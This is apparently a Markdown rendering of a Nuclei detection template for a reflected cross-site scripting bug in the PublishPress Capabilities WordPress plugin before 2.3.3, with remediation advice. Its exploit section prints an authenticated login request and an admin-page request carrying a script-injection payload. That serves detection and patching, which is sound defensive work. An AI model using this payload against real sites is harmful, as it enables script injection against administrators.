# Nuclei Template: PublishPress Capabilities < 2.3.3 - Cross-Site Scripting
**Template ID:** wp-publishpress-capabilities-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-publishpress-capabilities-xss.yaml`)

## Vulnerability Information & PoC

## Description
The PublishPress Capabilities plugin for WordPress before 2.3.3 does not escape a form action URL before outputting it back in an attribute, leading to Reflected Cross-Site Scripting (XSS).

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php?redirect_to=http%3A%2F%2F{{Hostname}}%2Fwp-admin%2Foptions-general.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=pp-capabilities-roles&a%22%3E%3Cscript%3Ealert("document.domain")%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Update the PublishPress Capabilities plugin to version 2.3.3 or later.

## References
- https://wpscan.com/vulnerability/88a57716-6e8b-4e98-884d-5534074c601a/
